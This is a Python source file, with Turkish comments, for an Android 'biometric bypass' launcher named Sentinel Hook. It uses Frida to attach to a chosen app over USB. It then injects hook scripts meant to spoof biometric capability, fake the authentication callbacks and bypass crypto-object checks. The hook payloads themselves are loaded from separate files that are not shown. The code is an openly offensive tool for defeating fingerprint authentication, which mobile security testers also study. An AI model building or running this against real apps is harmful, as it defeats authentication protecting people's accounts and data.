#!/usr/bin/env python3
"""
Sentinel Hook - Biometric Launcher (Phase 2.5)
Tüm Android Biyometrik bypass hooklarını otomatik yükleyen Python wrapper aracı.
"""

import frida
import sys
import argparse
import os

print("""
  .-'---`-.
,'          `.
|             \ 
|              \ 
\             .'
 `._       _.'
    `-----'
SENTINEL HOOK - Biometric Launcher
""")

def on_message(message, data):
    if message['type'] == 'send':
        print(f"[*] {message['payload']}")
    else:
        print(message)

def load_hook(script_path):
    try:
        with open(script_path, 'r') as f:
            return f.read()
    except Exception as e:
        print(f"[-] Hata: {script_path} okunamadı. {e}")
        return ""

def main():
    parser = argparse.ArgumentParser(description="Sentinel Hook Android Biometric Bypass Launcher")
    parser.add_argument("--target", required=True, help="Hedef uygulamanın paket adı (örn: com.example.app)")
    parser.add_argument("--method", choices=["callback", "crypto", "full"], default="full", help="Hangi bypass yöntemi yüklensin?")
    
    args = parser.parse_args()
    
    print(f"[*] Cihaz taraması yapılıyor...")
    device = frida.get_usb_device(timeout=5)
    
    print(f"[*] Hedef paket: {args.target}")
    try:
        session = device.attach(args.target)
    except frida.ProcessNotFoundError:
        print(f"[-] Hata: Uygulama hedefi bulunamadı. Lütfen cihazda açın ve tekrar deneyin.")
        sys.exit(1)

    payload = ""
    base_path = "src/hooks/"
    
    if args.method in ["callback", "full"]:
        payload += load_hook(os.path.join(base_path, "biometric_callback_hook.js"))
        payload += load_hook(os.path.join(base_path, "biometric_capability_spoof.js"))
    
    if args.method in ["crypto", "full"]:
        payload += load_hook(os.path.join(base_path, "crypto_object_bypass.js"))
        
    if not payload:
        print("[-] Hiçbir payload yüklenemedi.")
        sys.exit(1)

    print("[+] Hook'lar enjekte ediliyor...")
    script = session.create_script(payload)
    script.on('message', on_message)
    script.load()

    print("[✅] Operasyon Başarılı. Sensordan dönülecek yanıtlar manipüle edilecek.")
    print("     Çıkmak için Enter'a basın...\n")
    sys.stdin.read()

if __name__ == "__main__":
    main()
